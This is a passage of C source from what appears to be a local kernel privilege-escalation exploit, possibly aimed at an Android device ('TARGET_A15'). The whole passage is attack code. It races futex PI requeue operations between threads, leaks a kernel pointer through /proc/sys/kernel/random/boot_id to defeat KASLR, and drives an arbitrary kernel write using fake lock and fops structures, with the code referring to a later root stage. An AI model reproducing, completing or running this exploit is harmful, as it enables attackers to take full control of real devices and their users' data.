    pr_error("slide owner lock chain ret=%ld errno=%d\n", chain_ret,
             errno);
    return NULL;
  }

  for (;;) {
    sleep(1);
  }
}

int hex_value(char c) {
  if (c >= '0' && c <= '9') {
    return c - '0';
  }
  if (c >= 'a' && c <= 'f') {
    return c - 'a' + 10;
  }
  if (c >= 'A' && c <= 'F') {
    return c - 'A' + 10;
  }
  return -1;
}

uint64_t slide_read_stext(void) {
  char buf[64];
  unsigned char raw[16];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide boot_id read denied errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n < 0) {
    pr_warning("slide boot_id read failed errno=%d\n", saved_errno);
    return 0;
  }
  buf[n] = 0;

  int nibble = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v = hex_value(buf[i]);
    if (v < 0) {
      continue;
    }
    if (nibble < 0) {
      nibble = v;
      continue;
    }
    raw[out++] = (unsigned char)((nibble << 4) | v);
    nibble = -1;
  }
  if (out != 16) {
    pr_warning("slide short boot_id parse out=%d n=%zd\n", out, n);
    return 0;
  }

  uint64_t leaked = 0;
  for (int i = 0; i < 8; i++) {
    leaked |= (uint64_t)raw[i] << (i * 8);
  }
  if ((leaked >> 48) != 0xffff) {
    pr_warning("slide bad leaked pointer=%016llx\n",
               (unsigned long long)leaked);
    return 0;
  }

#ifdef TARGET_A15
  uint64_t expected = page_base + 0x180;
  if (env_flag("SLIDE_MCAST_REDIRECT", 1) || leaked != expected) {
    pr_warning("slide MCAST write readback mismatch value=%016llx "
               "expected=%016llx redirect=%d\n",
               (unsigned long long)leaked,
               (unsigned long long)expected,
               env_flag("SLIDE_MCAST_REDIRECT", 1));
    return 0;
  }
  atomic_store(&slide_mcast_write_verified, 1);
  pr_success("slide MCAST controlled write verified via boot_id: "
             "value=%016llx target=boot_id.data\n",
             (unsigned long long)leaked);
  return 0;
#endif

  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER);
  uint64_t stext = leaked - off;
  pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
             getpid(), (unsigned long long)leaked, (unsigned long long)stext);
  pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
             getpid(), (unsigned long long)stext);
  return stext;
}
uint64_t slide_child_leak_stext(void) {
  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  slide_f_wait = 0;
  slide_f_pi_target = 0;
  slide_f_pi_chain = 0;
  atomic_store(&slide_waiter_ready, 0);
  atomic_store(&slide_waiter_waiting, 0);
  atomic_store(&slide_owner_started, 0);
  atomic_store(&slide_route_done, 0);
  atomic_store(&slide_waiter_tid, 0);
  atomic_store(&slide_mcast_requeue_ret, -2);
  atomic_store(&slide_mcast_requeue_errno, 0);
  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  long requeue_ret = -2;
  int requeue_errno = 0;
#ifdef TARGET_A15
  if (slide_wait_for_chain_waiter()) {
#endif
    errno = 0;
    requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1,
                           (void *)1, &slide_f_pi_target, 0);
    requeue_errno = errno;
#ifdef TARGET_A15
  } else {
    pr_warning("slide MCAST requeue skipped: owner not queued on chain\n");
  }
#endif
  atomic_store(&slide_mcast_requeue_errno, requeue_errno);
  atomic_store(&slide_mcast_requeue_ret, (int)requeue_ret);
  pr_info("slide MCAST PI requeue ret=%ld errno=%d\n",
          requeue_ret, requeue_errno);

  while (!atomic_load(&slide_route_done)) {
    sleep(1);
  }

  if (env_flag("SLIDE_MCAST_REDIRECT", 1)) {
    pr_warning("slide MCAST scratch redirect has no boot_id readback; "
               "survival does not verify a write\n");
    return 0;
  }

  return slide_read_stext();
}

static int slide_mcast_custom_route_child(void) {
  slide_f_wait = 0;
  slide_f_pi_target = 0;
  slide_f_pi_chain = 0;
  atomic_store(&slide_waiter_ready, 0);
  atomic_store(&slide_waiter_waiting, 0);
  atomic_store(&slide_owner_started, 0);
  atomic_store(&slide_mcast_requeue_ret, -2);
  atomic_store(&slide_mcast_requeue_errno, 0);
  atomic_store(&slide_route_done, 0);
  atomic_store(&slide_waiter_tid, 0);
  atomic_store(&slide_consume_calls, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_seen, 0);
  atomic_store(&slide_consume_lost, 0);
  atomic_store(&slide_consume_enter_sched, 0);
  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_last_sched_ret, -1);
  atomic_store(&slide_consume_last_sched_errno, 0);
  atomic_store(&slide_consume_wait_copy, 0);
  atomic_store(&slide_mcast_copy_ready, 0);
  atomic_store(&slide_mcast_attempted, 0);
  atomic_store(&slide_mcast_write_verified, 0);
  atomic_store(&slide_mcast_copied, 0);

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));
  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started)) {
    usleep(1000);
  }
  /* Match the timing of slide_child_leak_stext(): the verified boot-ID
   * writes requeued immediately after both threads reached their gates.
   * An extra 50 ms here changes the lifetime of the stack-resident PI waiter
   * before the MCAST copy and was present only in this custom-target fork. */
  long requeue_ret = -2;
  int requeue_errno = 0;
#ifdef TARGET_A15
  if (slide_wait_for_chain_waiter()) {
#endif
    errno = 0;
    requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1,
                           (void *)1, &slide_f_pi_target, 0);
    requeue_errno = errno;
#ifdef TARGET_A15
  } else {
    pr_warning("MCAST requeue skipped: owner not queued on chain\n");
  }
#endif
  atomic_store(&slide_mcast_requeue_errno, requeue_errno);
  atomic_store(&slide_mcast_requeue_ret, (int)requeue_ret);
  pr_info("slide MCAST PI requeue ret=%ld errno=%d\n",
          requeue_ret, requeue_errno);
  while (!atomic_load(&slide_route_done))
    usleep(1000);

  if (!atomic_load(&slide_mcast_copied))
    return 0;
  return atomic_load(&slide_consume_sched_ok) > 0 ? 2 : 1;
}

/* Run the MCAST writer in a short-lived child so its waiter/owner threads
 * cannot leak into the root chain. The prepared skb-backed page is inherited
 * from the caller and remains live in the parent for the CFI stage. */
int slide_mcast_run_custom_route(uintptr_t target, uintptr_t value) {
  if (!page_base || !fake_lock || !fake_fops || !target || !value ||
      (target & 7) || (value & 3) ||
      !tracefs_slide_verified || !kaslr_done ||
      env_flag("SLIDE_MCAST_NULL", 0) ||
      env_int_range("SLIDE_MCAST_WAITER_OFF", MCAST_WAITER_OFF,
                    0, MCAST_STAMP_LEN - 0x58) != MCAST_WAITER_OFF ||
      !verify_mcast_fops_payload(target, value)) {
    pr_error("MCAST route rejected page=%016zx lock=%016zx fops=%016zx "
             "target=%016zx value=%016zx tracefs=%d kaslr=%d waiter_off=%x\n",
             page_base, fake_lock, fake_fops, target, value,
             getenv("SLIDE_USE_TRACEFS") != NULL, kaslr_done,
             env_int_range("SLIDE_MCAST_WAITER_OFF", MCAST_WAITER_OFF,
                           0, MCAST_STAMP_LEN - 0x58));
    return 0;
  }

  slide_mcast_custom_target = target;
  slide_mcast_custom_value = value;
  atomic_store(&slide_mcast_custom_route, 1);
  pid_t child = fork();
  if (child < 0) {
    atomic_store(&slide_mcast_custom_route, 0);
    pr_error("MCAST route fork failed errno=%d\n", errno);
    return 0;
  }
  if (child == 0) {
    int route_status = slide_mcast_custom_route_child();
    _exit(route_status);
  }

  int status = 0;
  if (waitpid(child, &status, 0) < 0) {
    pr_error("MCAST route waitpid failed errno=%d\n", errno);
    atomic_store(&slide_mcast_custom_route, 0);
    return 1; /* uncertain: caller must keep the payload backing alive */
  }
  atomic_store(&slide_mcast_custom_route, 0);
  if (!WIFEXITED(status)) {
    pr_error("MCAST route child ended unexpectedly status=%d\n", status);
    return 1; /* uncertain: caller must keep the payload backing alive */
  }
  int route_status = WEXITSTATUS(status);
  if (route_status == 2)
    pr_success("MCAST PI consumer syscall returned success; target write remains unverified\n");
  else if (route_status == 1)
    pr_warning("MCAST copied payload but consumer success was not confirmed\n");
  else
    pr_error("MCAST request did not reach the expected copy path\n");
  return route_status;
}

int slide_leak_kernel_base(void) {
#ifdef TARGET_A15
  if (getenv("SLIDE_USE_TRACEFS")) {
    uint64_t base = slide_tracefs_leak_kernel_base();
    if (!base)
      return 0;
    kaslr_base = base;
    kaslr_slide = base - KIMAGE_TEXT_BASE;
    kaslr_done = 1;
    tracefs_slide_verified = 1;
    return 1;
  }
#endif
  for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    if (!page_base || !fake_lock) {
      continue;
    }

    int raw_fds[2];
    SYSCHK(pipe(raw_fds));
    int fds[2];
    fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 128));
    fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 129));
    SYSCHK(close(raw_fds[0]));
    SYSCHK(close(raw_fds[1]));

    pid_t child = SYSCHK(fork());
    if (child == 0) {
      SYSCHK(close(fds[0]));
      disable_rseq_for_thread();
      log_slide_child_context();
      uint64_t stext = slide_child_leak_stext();
      if (stext) {
        SYSCHK(write(fds[1], &stext, sizeof(stext)));
        _exit(0);
      }
      if (atomic_load(&slide_mcast_write_verified)) {
        _exit(3);
      }
      if (atomic_load(&slide_mcast_attempted)) {
        _exit(2);
      }
      _exit(1);
    }

    SYSCHK(close(fds[1]));
    uint64_t stext = 0;
    ssize_t n = read(fds[0], &stext, sizeof(stext));
    SYSCHK(close(fds[0]));
    int status = 0;
    SYSCHK(waitpid(child, &status, 0));
    if (WIFEXITED(status) && WEXITSTATUS(status) == 3) {
      pr_success("slide write readback passed; no KASLR slide was derived, "
                 "stopping before root stage\n");
      break;
    }
    if (WIFEXITED(status) && WEXITSTATUS(status) == 2) {
      pr_warning("slide attempt %d reached MCAST without verified write "
                 "readback; stopping retries\n", attempt);
      break;
    }
    if (n != (ssize_t)sizeof(stext) || !WIFEXITED(status) ||
        WEXITSTATUS(status) != 0 || !stext) {
      pr_warning("slide attempt %d failed n=%zd status=%d\n",
                 attempt, n, status);
      continue;
    }

    kaslr_base = stext;
    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
    kaslr_done = 1;
    pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide);
    return 1;
  }

  return 0;
}
